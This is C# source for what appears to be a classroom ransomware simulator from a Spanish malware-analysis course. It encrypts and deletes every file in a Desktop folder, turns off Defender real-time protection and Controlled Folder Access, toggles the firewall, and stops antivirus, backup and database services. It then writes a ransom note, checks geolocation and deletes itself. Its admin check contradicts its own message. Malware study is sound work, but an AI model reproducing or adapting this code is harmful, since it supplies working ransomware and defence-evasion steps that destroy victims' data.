using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Demo1
{
    internal class Program
    {

        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                      .IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }
            return data;
        }

        static void FileEncrypt(string inputFile, string password)
        {

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ".viu", FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        static void StopServices()
        {
            // Some ransomware change the state of the services
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY$ECWDB2 start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLWriter start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SstpSvc start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config MBAMService start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config wuauserv start=disabled");

            // Stopping services so that there will be no file lock issue during encryption process
            // Only a handful of services are stopped
            Process.Start(@"C:\Windows\System32\net.exe", "stop KAVFS");
            Process.Start(@"C:\Windows\System32\net.exe", "stop klnagent");
            Process.Start(@"C:\Windows\System32\net.exe", "stop TrueKey");
            Process.Start(@"C:\Windows\System32\net.exe", "stop TrueKeyScheduler");
            Process.Start(@"C:\Windows\System32\net.exe", "stop AcronisAgent");
            Process.Start(@"C:\Windows\System32\net.exe", "stop SQLWriter");
            Process.Start(@"C:\Windows\System32\net.exe", "stop SQLBrowser");
            Process.Start(@"C:\Windows\System32\net.exe", "stop MSExchangeES");
            Process.Start(@"C:\Windows\System32\net.exe", "stop MSExchangeSRS");
            Process.Start(@"C:\Windows\System32\net.exe", "stop OracleClientCache80");
            Process.Start(@"C:\Windows\System32\net.exe", "stop ShMonitor");
            Process.Start(@"C:\Windows\System32\net.exe", "stop McAfeeEngineService");
            Process.Start(@"C:\Windows\System32\net.exe", "stop MBEndpointAgent");
            Process.Start(@"C:\Windows\System32\net.exe", "stop EhttpSrv");
        }

        static void DisableFirewall()
        {
            // Disable Defender Firewall
            Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state off");
            System.Threading.Thread.Sleep(3000);
            // Enable it back
            Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state on");
            System.Threading.Thread.Sleep(500);

        }

        static void DisableAV()
        {
            // Although AV is already disabled, this is to monitor for AV disabling attempts

            // Disable Defender's Real-Time Monitoring
            Process.Start("powershell.exe", "-command Set-MpPreference -DisableRealtimeMonitoring 1");

            // Disable Defender's Controlled Folder Access
            Process.Start("powershell.exe", "-command Set-MpPreference -EnableControlledFolderAccess Disabled");
        }

        static void RansomNote(string ransomNote)
        {
            try
            {
                // Check if file already exists. If yes, delete it.     
                if (File.Exists(ransomNote))
                {
                    File.Delete(ransomNote);
                }

                // Create a new file     
                using (StreamWriter sw = File.CreateText(ransomNote))
                {
                    sw.WriteLine("Fichero creado el: {0}", DateTime.Now.ToString());
                    sw.WriteLine("¡Saludos! El grupo de hacking Pantera Rosa te ha comprometido la red e infectado el ordenador");
                    sw.WriteLine("Pero no te preocupes somos como los hackers de los 80 y tan solo queremos aprender hackeando :)");
                    sw.WriteLine("Asi que solo te hemos cifrado una carpeta en tu Escritorio :O");
                    sw.WriteLine("Si quieres saber la contraseña y como se ha cifrado puedes aplicar las técnicas que vas a conocer en el curso de Análisis de malware de la VIU :) ");
                    sw.WriteLine("Un saludos y hasta la próxima! https://www.youtube.com/watch?v=dQw4w9WgXcQ");
                }

                // Write file contents on console.     
                using (StreamReader sr = File.OpenText(ransomNote))
                {
                    string s = "";
                    while ((s = sr.ReadLine()) != null)
                    {
                        Console.WriteLine(s);
                    }
                }
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex.ToString());
            }
        }

        static void LocationCheck()
        {
            // Use ipinfo to obtain geolocation information
            string responseJSON = string.Empty;
            string url = @"https://ipinfo.io/json";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.AutomaticDecompression = DecompressionMethods.GZip;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                responseJSON = reader.ReadToEnd();
            }

            Console.WriteLine(responseJSON);
        }

        static void SelfDelete()
        {
            // Delete itself
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Process.Start("cmd.exe", "/c ping 1.1.1.1 -n 5 > Nul & Del " + exePath + " /F /Q");
        }

        static void Main(string[] args)
        {

            const string targetDir = "Desktop\\Documentos";
            const string ransomNote = "VIU-Ransom.txt";
            const string tempDir = "clase";
            const string randomPassword = "VIU2022";
            string userDirPath = Environment.GetEnvironmentVariable("USERPROFILE");
            string targetDirPath = userDirPath + @"\" + targetDir;
            string[] files = Directory.GetFiles(targetDirPath, "*");

            string tempDirPath = userDirPath + @"\" + tempDir;

            // Check if Ransim was ran as Admin
            if (IsAdministrator() == true)
            {
                Console.WriteLine("¡Lanza el ejecutable como administrador!");
                Console.WriteLine("Saliendo...");
                return;
            }

            if (!Directory.Exists(targetDirPath))
            {
                // Precaution
                Console.WriteLine("¡No has creado la carpeta de Documentos en el Escritorio!");
                Console.WriteLine("Saliendo...");
                return;
            }

            //Run Location Check
            LocationCheck();

            DisableAV();
            DisableFirewall();

            StopServices();

            Console.WriteLine("¡Cifrando el sistema!");
            
            // Iterate over files in the target directory for encryption.
            foreach (string file in files)
            {
                FileEncrypt(file, randomPassword);
                File.Delete(file);
            }

            Console.WriteLine("Creando la nota de rescate...");
            // Download ransom note from Pastebin.
            RansomNote(ransomNote);

            // Open notepad to display the ransom note.
            Process.Start("notepad.exe", ransomNote);

            Console.WriteLine("Adios clase!");

            // Initiate Self Delete Procedure
            SelfDelete();
        }
    }
}
